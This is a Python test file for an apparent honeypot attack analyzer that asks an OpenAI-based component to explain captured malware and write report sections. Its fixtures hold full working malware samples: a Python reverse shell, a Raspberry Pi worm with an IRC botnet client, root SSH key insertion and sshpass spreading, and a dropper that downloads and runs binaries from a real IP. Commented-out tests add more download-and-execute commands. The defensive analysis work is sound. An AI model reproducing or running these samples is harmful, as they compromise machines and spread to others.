from analyzerbase import *

from netanalyzers.ipanalyzer import IPAnalyzer
from loganalyzers.cowrieloganalyzer import CowrieLogAnalyzer, Attack
from openaianalyzers.openaianalyzer import OpenAIAnalyzer, OPENAI_API_KEY
from main import AttackAnalyzer

class TestOpenAIAnalyzer(TestCase):
    
    @classmethod
    def setUpClass(cls):
        cls.ai_analyzer = OpenAIAnalyzer()
        cls.test_malware_source_code1="""import socket
import os
import argparse
import pty


if __name__ == "__main__":
    parser=argparse.ArgumentParser()
    parser.add_argument('-s', '--shell',
                        required=False,
                        action='store',
                        default="/bin/bash",
                        help="The shell to spawn")
    parser.add_argument('-l', '--host', 
                        required=False, 
                        action='store', 
                        default="127.0.0.1", 
                        help='The IP address to connect to')
    parser.add_argument('-p', '--port',
                        required=False,
                        type=int, 
                        default=6969, 
                        help="A comma separated list of ports to try to connect to")
    
    parser.add_argument('-f', '--family',
                        required=False,
                        default=socket.AF_INET,
                        type=lambda s: getattr(socket, s),
                        help="The socket family to use")
    parser.add_argument('-t', '--type',
                        required=False,
                        default=socket.SOCK_STREAM,
                        type=lambda s: getattr(socket, s),
                        help="The socket type to use")
    parser.add_argument('--protocol',
                        required=False,
                        default=-1,
                        type=int,
                        help="The socket protocol to use")
    parser.add_argument('--fileno',
                        required=False,
                        default=None,
                        type=int,
                        help="The file descriptor to use")
    
    args=parser.parse_args()

    s = socket.socket(family=args.family, type=args.type, proto=args.protocol, fileno=args.fileno)
    s.connect((args.host, args.port))

    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    
    pty.spawn(args.shell)
"""

        
        cls.test_malware_source_code2 = """C0755 4745 D6oCtPlu
#!/bin/bash

MYSELF=`realpath $0`
DEBUG=/dev/null
echo $MYSELF >> $DEBUG

if [ "$EUID" -ne 0 ]
then 
	NEWMYSELF=`mktemp -u 'XXXXXXXX'`
	sudo cp $MYSELF /opt/$NEWMYSELF
	sudo sh -c "echo '#!/bin/sh -e' > /etc/rc.local"
	sudo sh -c "echo /opt/$NEWMYSELF >> /etc/rc.local"
	sudo sh -c "echo 'exit 0' >> /etc/rc.local"
	sleep 1
	sudo reboot
else
TMP1=`mktemp`
echo $TMP1 >> $DEBUG

killall bins.sh
killall minerd
killall node
killall nodejs
killall ktx-armv4l
killall ktx-i586
killall ktx-m68k
killall ktx-mips
killall ktx-mipsel
killall ktx-powerpc
killall ktx-sh4
killall ktx-sparc
killall arm5
killall zmap
killall kaiten
killall perl

echo "127.0.0.1 bins.deutschland-zahlung.eu" >> /etc/hosts
rm -rf /root/.bashrc
rm -rf /home/pi/.bashrc

usermod -p \$6\$vGkGPKUr\$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi

mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B"  >> /root/.ssh/authorized_keys

echo "nameserver 8.8.8.8" >> /etc/resolv.conf
rm -rf /tmp/ktx*
rm -rf /tmp/cpuminer-multi
rm -rf /var/tmp/kaiten

cat > /tmp/public.pem <<EOFMARKER
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs
glv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW
rXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF
WRq+Z8HYMvPlgSRA3wIDAQAB
-----END PUBLIC KEY-----
EOFMARKER

BOT=`mktemp -u 'XXXXXXXX'`

cat > /tmp/$BOT <<'EOFMARKER'
#!/bin/bash

SYS=`uname -a | md5sum | awk -F' ' '{print $1}'`
NICK=a${SYS:24}
while [ true ]; do

	arr[0]="ix1.undernet.org"
	arr[1]="ix2.undernet.org"
	arr[2]="Ashburn.Va.Us.UnderNet.org"
	arr[3]="Bucharest.RO.EU.Undernet.Org"
	arr[4]="Budapest.HU.EU.UnderNet.org"
	arr[5]="Chicago.IL.US.Undernet.org"
	rand=$[$RANDOM % 6]
	svr=${arr[$rand]}

	eval 'exec 3<>/dev/tcp/$svr/6667;'
	if [[ ! "$?" -eq 0 ]] ; then
			continue
	fi

	echo $NICK

	eval 'printf "NICK $NICK\r\n" >&3;'
	if [[ ! "$?" -eq 0 ]] ; then
			continue
	fi
	eval 'printf "USER user 8 * :IRC hi\r\n" >&3;'
	if [[ ! "$?" -eq 0 ]] ; then
		continue
	fi

	# Main loop
	while [ true ]; do
		eval "read msg_in <&3;"

		if [[ ! "$?" -eq 0 ]] ; then
			break
		fi

		if  [[ "$msg_in" =~ "PING" ]] ; then
			printf "PONG %s\n" "${msg_in:5}";
			eval 'printf "PONG %s\r\n" "${msg_in:5}" >&3;'
			if [[ ! "$?" -eq 0 ]] ; then
				break
			fi
			sleep 1
			eval 'printf "JOIN #biret\r\n" >&3;'
			if [[ ! "$?" -eq 0 ]] ; then
				break
			fi
		elif [[ "$msg_in" =~ "PRIVMSG" ]] ; then
			privmsg_h=$(echo $msg_in| cut -d':' -f 3)
			privmsg_data=$(echo $msg_in| cut -d':' -f 4)
			privmsg_nick=$(echo $msg_in| cut -d':' -f 2 | cut -d'!' -f 1)

			hash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F' ' '{print $1}'`
			sign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`

			if [[ "$sign" == "$hash" ]] ; then
				CMD=`echo $privmsg_data | base64 -d -i`
				RES=`bash -c "$CMD" | base64 -w 0`
				eval 'printf "PRIVMSG $privmsg_nick :$RES\r\n" >&3;'
				if [[ ! "$?" -eq 0 ]] ; then
					break
				fi
			fi
		fi
	done
done
EOFMARKER

chmod +x /tmp/$BOT
nohup /tmp/$BOT 2>&1 > /tmp/bot.log &
rm /tmp/nohup.log -rf
rm -rf nohup.out
sleep 3
rm -rf /tmp/$BOT

NAME=`mktemp -u 'XXXXXXXX'`

date > /tmp/.s

apt-get update -y --force-yes
apt-get install zmap sshpass -y --force-yes

while [ true ]; do
	FILE=`mktemp`
	zmap -p 22 -o $FILE -n 100000
	killall ssh scp
	for IP in `cat $FILE`
	do
		sshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberry ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &
		sshpass -praspberryraspberry993311 scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberryraspberry993311 ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &
	done
	rm -rf $FILE
	sleep 10
done

fi

"""
        cls.test_malware_source_code3 = """binarys="jklmips jklmpsl jklarm jklarm5 jklarm6 jklarm7 jklx86 jklppc jklspc jklm68k"
server_ip="94.156.68.152"
output="vh"

for arch in $binarys
do
rm -rf $arch
rm -rf $output
wget http://$server_ip/bins/$arch -O $output || curl -o $output http://$server_ip/bins/$arch || tftp -g -l $output -r $arch $server_ip || tftp $server_ip -c get $arch -l $output
chmod 777 $output
./$output $1
rm -rf $arch
rm -rf $output
done
"""
        
        
        cls.test_commands1 =  cls.ai_analyzer.read_training_data("shared/example_commands1.sh", returnas=list)
        cls.test_commands2 = ['scp -t /tmp/50kmIX7P', 'cd /tmp && chmod +x 50kmIX7P && bash -c ./50kmIX7P', './50kmIX7P']
        cls.test_commands3 =  cls.ai_analyzer.read_training_data("shared/example_commands3.sh", returnas=list)

        cls.test_keys = [
        "fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054",
        #"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "440e8a6e0ddc0081c39663b5fcc342a6aa45185eb53c826d5cf6cddd9b87ea64",
        #"0229d56a715f09337b329f1f6ced86e68b6d0125747faafdbdb3af2f211f56ac",
        #"04a9aabb18e701dbe12c2606538202dc02156f480f3d58d926d20bd9bc613451",
        "275776445b4225c06861b2f6f4e2ccf98e3f919583bddb9965d8cf3d4f6aa18f",
        "c41b0875c506cc9421ae26ee43bd9821ccd505e9e24a732c8a9c0180eb34a5a8",
        
        ]

        cls.analyzer = AttackAnalyzer()
        cls.analyzer.load_attacks_from_attack_dir(only_attacks=cls.test_keys)


    # def test_explain_commands(self):
    #     commands = ['echo 1 && cat /bin/echo', 
    #             'nohup $SHELL -c "curl http://94.230.232.6:60142/linux -o /tmp/f1HcUi057v', 
    #             'if [ ! -f /tmp/f1HcUi057v ]; then wget http://94.230.232.6:60142/linux -O /tmp/f1HcUi057v; fi;', 
    #             "if [ ! -f /tmp/f1HcUi057v ]; then exec 6<>/dev/tcp/94.230.232.6/60142 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/f1HcUi057v && chmod +x /tmp/f1HcUi057v && /tmp/f1HcUi057v TBxkRntvhxAYm3d4WGcOPDcKZUd8d5UQGZtwcEV7DTgjBG1MfnGEERKVeHxYZw89Iw5mRGZ3jxcRhHV6VmYSPD0Ne0d9dZsYFI93eEdlBC08DmBYf3ibEBGDb3lCbwo9PA9lVnl3gQ8Yh29/TnsNOjUGY0Z5c40BEIFwZkdhBCM8CWRYcHuDERCFcmhOYBI8NAR7T2ZwhBQbg3F5RmMcNSMNZkZmdIAPFYR7fkZkDT4tDWRPZniDDxCFcWZHbA83OwxkQnFhhBkUm3N8Q3sIPCMOZURyd4UQEIdhekdsEjw5CXtHe3KbFBCPd3hHZgstPAVmWHlwhw8Vh295RW8KPTwPbVZ5cYMPEIFvekJtEjw9BmNGeXWGARSMb3lHZRI/PhJnRH57gxEQgXhoRWMSOiMNYkdmc4QbF4Vwe0F1DTUjDmdHZnCDFA+EeXxMYww8OQx1Qn9vjBUPhHVmR2QNNzsMZEd/YYEUD4d1cFhkDCM/DmRMfnGEERCVcHBEewo8Iw5iWH13jxcRhHB8VmQNPCMOZ09mcoUPE4F3ckBlDT87HGRYeXCCDxiGb3pCZwY7PQ1nTmhwhRcPgHJmQWcSNDgGY0Z5cIMBEIR5ZkVkEjw8CntEfXOPFxGEcHpWYQ4jPAVnWHpxjQ8ThHhyQGUNPD4cZE57b4cVF5twcE97Cz83CmVHeHCVEBiFb35Hew85Iw1jQ3J3hRASgWF5RmYSPDgPe0dwdZsTFY93eEdnDi08DGRYenGFDxSMb3lDYQY7PQ1nT2hyjA8QhXBmR2MOIzwFbEx+cYQSGMBUyjosBY0HJjhEZEyfaM3RwQ==; fi;", 'echo 123456 > /tmp/.opass', 
    #             'chmod +x /tmp/f1HcUi057v && /tmp/f1HcUi057v TBxkRntvhxAYm3d4WGcOPDcKZUd8d5UQGZtwcEV7DTgjBG1MfnGEERKVeHxYZw89Iw5mRGZ3jxcRhHV6VmYSPD0Ne0d9dZsYFI93eEdlBC08DmBYf3ibEBGDb3lCbwo9PA9lVnl3gQ8Yh29/TnsNOjUGY0Z5c40BEIFwZkdhBCM8CWRYcHuDERCFcmhOYBI8NAR7T2ZwhBQbg3F5RmMcNSMNZkZmdIAPFYR7fkZkDT4tDWRPZniDDxCFcWZHbA83OwxkQnFhhBkUm3N8Q3sIPCMOZURyd4UQEIdhekdsEjw5CXtHe3KbFBCPd3hHZgstPAVmWHlwhw8Vh295RW8KPTwPbVZ5cYMPEIFvekJtEjw9BmNGeXWGARSMb3lHZRI/PhJnRH57gxEQgXhoRWMSOiMNYkdmc4QbF4Vwe0F1DTUjDmdHZnCDFA+EeXxMYww8OQx1Qn9vjBUPhHVmR2QNNzsMZEd/YYEUD4d1cFhkDCM/DmRMfnGEERCVcHBEewo8Iw5iWH13jxcRhHB8VmQNPCMOZ09mcoUPE4F3ckBlDT87HGRYeXCCDxiGb3pCZwY7PQ1nTmhwhRcPgHJmQWcSNDgGY0Z5cIMBEIR5ZkVkEjw8CntEfXOPFxGEcHpWYQ4jPAVnWHpxjQ8ThHhyQGUNPD4cZE57b4cVF5twcE97Cz83CmVHeHCVEBiFb35Hew85Iw1jQ3J3hRASgWF5RmYSPDgPe0dwdZsTFY93eEdnDi08DGRYenGFDxSMb3lDYQY7PQ1nT2hyjA8QhXBmR2MOIzwFbEx+cYQSGMBUyjosBY0HJjhEZEyfaM3RwQ==" &', 'head -c 0 > /tmp/X23ZoPo761', 'chmod 777 /tmp/X23ZoPo761', '/tmp/X23ZoPo761 TBxkRntvhxAYm3d4WGcOPDcKZUd8d5UQGZtwcEV7DTgjBG1MfnGEERKVeHxYZw89Iw5mRGZ3jxcRhHV6VmYSPD0Ne0d9dZsYFI93eEdlBC08DmBYf3ibEBGDb3lCbwo9PA9lVnl3gQ8Yh29/TnsNOjUGY0Z5c40BEIFwZkdhBCM8CWRYcHuDERCFcmhOYBI8NAR7T2ZwhBQbg3F5RmMcNSMNZkZmdIAPFYR7fkZkDT4tDWRPZniDDxCFcWZHbA83OwxkQnFhhBkUm3N8Q3sIPCMOZURyd4UQEIdhekdsEjw5CXtHe3KbFBCPd3hHZgstPAVmWHlwhw8Vh295RW8KPTwPbVZ5cYMPEIFvekJtEjw9BmNGeXWGARSMb3lHZRI/PhJnRH57gxEQgXhoRWMSOiMNYkdmc4QbF4Vwe0F1DTUjDmdHZnCDFA+EeXxMYww8OQx1Qn9vjBUPhHVmR2QNNzsMZEd/YYEUD4d1cFhkDCM/DmRMfnGEERCVcHBEewo8Iw5iWH13jxcRhHB8VmQNPCMOZ09mcoUPE4F3ckBlDT87HGRYeXCCDxiGb3pCZwY7PQ1nTmhwhRcPgHJmQWcSNDgGY0Z5cIMBEIR5ZkVkEjw8CntEfXOPFxGEcHpWYQ4jPAVnWHpxjQ8ThHhyQGUNPD4cZE57b4cVF5twcE97Cz83CmVHeHCVEBiFb35Hew85Iw1jQ3J3hRASgWF5RmYSPDgPe0dwdZsTFY93eEdnDi08DGRYenGFDxSMb3lDYQY7PQ1nT2hyjA8QhXBmR2MOIzwFbEx+cYQSGMBUyjosBY0HJjhEZEyfaM3RwQ==', 
    #             'cp /tmp/X23ZoPo761 /tmp/linux',
    #             'head -c 0 > /tmp/windows',
    #             'head -c 0 > /tmp/windows_sign',
    #             'head -c 0 > /tmp/arm_linux',
    #             'head -c 0 > /tmp/mips_linux',
    #             'head -c 0 > /tmp/mips_linux_sign',
    #             'head -c 0 > /tmp/winminer',
    #             'head -c 0 > /tmp/arm_linux_sign',
    #             'head -c 0 > /tmp/winminer_sign',
    #             'head -c 0 > /tmp/miner_sign',
    #             'head -c 0 > /tmp/miner',
    #             'head -c 0 > /tmp/mipsel_linux',
    #             'head -c 0 > /tmp/mipsel_linux_sign',
    #             'head -c 0 > /tmp/linux_sign',
    #             'exit'
    #         ]
        
    #     result = self.ai_analyzer.explain_commands(commands)
    #     print(result)



    # def test_explain_commands(self):
    #     commands = ['echo 1 && cat /bin/echo', 
    #             'nohup $SHELL -c "curl http://94.230.232.6:60142/linux -o /tmp/f1HcUi057v', 
    #             'if [ ! -f /tmp/f1HcUi057v ]; then wget http://94.230.232.6:60142/linux -O /tmp/f1HcUi057v; fi;', 
    #             "if [ ! -f /tmp/f1HcUi057v ]; then exec 6<>/dev/tcp/94.230.232.6/60142 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/f1HcUi057v && chmod +x /tmp/f1HcUi057v && /tmp/f1HcUi057v TBxkRntvhxAYm3d4WGcOPDcKZUd8d5UQGZtwcEV7DTgjBG1MfnGEERKVeHxYZw89Iw5mRGZ3jxcRhHV6VmYSPD0Ne0d9dZsYFI93eEdlBC08DmBYf3ibEBGDb3lCbwo9PA9lVnl3gQ8Yh29/TnsNOjUGY0Z5c40BEIFwZkdhBCM8CWRYcHuDERCFcmhOYBI8NAR7T2ZwhBQbg3F5RmMcNSMNZkZmdIAPFYR7fkZkDT4tDWRPZniDDxCFcWZHbA83OwxkQnFhhBkUm3N8Q3sIPCMOZURyd4UQEIdhekdsEjw5CXtHe3KbFBCPd3hHZgstPAVmWHlwhw8Vh295RW8KPTwPbVZ5cYMPEIFvekJtEjw9BmNGeXWGARSMb3lHZRI/PhJnRH57gxEQgXhoRWMSOiMNYkdmc4QbF4Vwe0F1DTUjDmdHZnCDFA+EeXxMYww8OQx1Qn9vjBUPhHVmR2QNNzsMZEd/YYEUD4d1cFhkDCM/DmRMfnGEERCVcHBEewo8Iw5iWH13jxcRhHB8VmQNPCMOZ09mcoUPE4F3ckBlDT87HGRYeXCCDxiGb3pCZwY7PQ1nTmhwhRcPgHJmQWcSNDgGY0Z5cIMBEIR5ZkVkEjw8CntEfXOPFxGEcHpWYQ4jPAVnWHpxjQ8ThHhyQGUNPD4cZE57b4cVF5twcE97Cz83CmVHeHCVEBiFb35Hew85Iw1jQ3J3hRASgWF5RmYSPDgPe0dwdZsTFY93eEdnDi08DGRYenGFDxSMb3lDYQY7PQ1nT2hyjA8QhXBmR2MOIzwFbEx+cYQSGMBUyjosBY0HJjhEZEyfaM3RwQ==; fi;", 'echo 123456 > /tmp/.opass', 
    #             'chmod +x /tmp/f1HcUi057v && /tmp/f1HcUi057v TBxkRntvhxAYm3d4WGcOPDcKZUd8d5UQGZtwcEV7DTgjBG1MfnGEERKVeHxYZw89Iw5mRGZ3jxcRhHV6VmYSPD0Ne0d9dZsYFI93eEdlBC08DmBYf3ibEBGDb3lCbwo9PA9lVnl3gQ8Yh29/TnsNOjUGY0Z5c40BEIFwZkdhBCM8CWRYcHuDERCFcmhOYBI8NAR7T2ZwhBQbg3F5RmMcNSMNZkZmdIAPFYR7fkZkDT4tDWRPZniDDxCFcWZHbA83OwxkQnFhhBkUm3N8Q3sIPCMOZURyd4UQEIdhekdsEjw5CXtHe3KbFBCPd3hHZgstPAVmWHlwhw8Vh295RW8KPTwPbVZ5cYMPEIFvekJtEjw9BmNGeXWGARSMb3lHZRI/PhJnRH57gxEQgXhoRWMSOiMNYkdmc4QbF4Vwe0F1DTUjDmdHZnCDFA+EeXxMYww8OQx1Qn9vjBUPhHVmR2QNNzsMZEd/YYEUD4d1cFhkDCM/DmRMfnGEERCVcHBEewo8Iw5iWH13jxcRhHB8VmQNPCMOZ09mcoUPE4F3ckBlDT87HGRYeXCCDxiGb3pCZwY7PQ1nTmhwhRcPgHJmQWcSNDgGY0Z5cIMBEIR5ZkVkEjw8CntEfXOPFxGEcHpWYQ4jPAVnWHpxjQ8ThHhyQGUNPD4cZE57b4cVF5twcE97Cz83CmVHeHCVEBiFb35Hew85Iw1jQ3J3hRASgWF5RmYSPDgPe0dwdZsTFY93eEdnDi08DGRYenGFDxSMb3lDYQY7PQ1nT2hyjA8QhXBmR2MOIzwFbEx+cYQSGMBUyjosBY0HJjhEZEyfaM3RwQ==" &', 'head -c 0 > /tmp/X23ZoPo761', 'chmod 777 /tmp/X23ZoPo761', '/tmp/X23ZoPo761 TBxkRntvhxAYm3d4WGcOPDcKZUd8d5UQGZtwcEV7DTgjBG1MfnGEERKVeHxYZw89Iw5mRGZ3jxcRhHV6VmYSPD0Ne0d9dZsYFI93eEdlBC08DmBYf3ibEBGDb3lCbwo9PA9lVnl3gQ8Yh29/TnsNOjUGY0Z5c40BEIFwZkdhBCM8CWRYcHuDERCFcmhOYBI8NAR7T2ZwhBQbg3F5RmMcNSMNZkZmdIAPFYR7fkZkDT4tDWRPZniDDxCFcWZHbA83OwxkQnFhhBkUm3N8Q3sIPCMOZURyd4UQEIdhekdsEjw5CXtHe3KbFBCPd3hHZgstPAVmWHlwhw8Vh295RW8KPTwPbVZ5cYMPEIFvekJtEjw9BmNGeXWGARSMb3lHZRI/PhJnRH57gxEQgXhoRWMSOiMNYkdmc4QbF4Vwe0F1DTUjDmdHZnCDFA+EeXxMYww8OQx1Qn9vjBUPhHVmR2QNNzsMZEd/YYEUD4d1cFhkDCM/DmRMfnGEERCVcHBEewo8Iw5iWH13jxcRhHB8VmQNPCMOZ09mcoUPE4F3ckBlDT87HGRYeXCCDxiGb3pCZwY7PQ1nTmhwhRcPgHJmQWcSNDgGY0Z5cIMBEIR5ZkVkEjw8CntEfXOPFxGEcHpWYQ4jPAVnWHpxjQ8ThHhyQGUNPD4cZE57b4cVF5twcE97Cz83CmVHeHCVEBiFb35Hew85Iw1jQ3J3hRASgWF5RmYSPDgPe0dwdZsTFY93eEdnDi08DGRYenGFDxSMb3lDYQY7PQ1nT2hyjA8QhXBmR2MOIzwFbEx+cYQSGMBUyjosBY0HJjhEZEyfaM3RwQ==', 
    #             'cp /tmp/X23ZoPo761 /tmp/linux',
    #             'head -c 0 > /tmp/windows',
    #             'head -c 0 > /tmp/windows_sign',
    #             'head -c 0 > /tmp/arm_linux',
    #             'head -c 0 > /tmp/mips_linux',
    #             'head -c 0 > /tmp/mips_linux_sign',
    #             'head -c 0 > /tmp/winminer',
    #             'head -c 0 > /tmp/arm_linux_sign',
    #             'head -c 0 > /tmp/winminer_sign',
    #             'head -c 0 > /tmp/miner_sign',
    #             'head -c 0 > /tmp/miner',
    #             'head -c 0 > /tmp/mipsel_linux',
    #             'head -c 0 > /tmp/mipsel_linux_sign',
    #             'head -c 0 > /tmp/linux_sign',
    #             'exit'
    #         ]
        
    #     result = self.ai_analyzer.explain_commands(commands)
    #     print(result)


    # def test_explain_malware(self):
        
    #     result = self.ai_analyzer.explain_malware(self.test_malware_source_code, self.test_commands)
        
    #     print(result)

    def test_comment_malware(self):
        
        result = self.ai_analyzer.comment_malware(self.test_malware_source_code3, self.test_commands3)
        
        print(result)

    def test_answer_questions(self):
        
        attack = self.analyzer.attacks["fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054"]
        attack.add_postprocessor(self.analyzer.ipanalyzer)

        questions = [
                    #"Summarize the attack",
                     #"What ips and ports were used?",
                     #"Which vulnerabilities does the attack attempt to exploit?",
                     #"What CVEs were used?",
                     #"How can this attack be classified using the MITRE ATT&CK framework?",
            #"What is the goal of the attack?",
            #            "If the system is vulnerable, do you think the attack will be successful?",
                    #"Which Session should be presented in the report? Respond with only a session_id",
                    "Write a short summary of the attack to begin the report",
                    "What do we know about the attacker from OSINT sources?",    
                    "What should the title of the report be?",
                    
                        #"How can a system be protected from this attack?",
                        #"What are the indicators of compromise (IOCs)?"
                        ]

        result = self.ai_analyzer.ass_answer_questions(
            questions=questions,
            attack=attack                                           )
        
        print(result)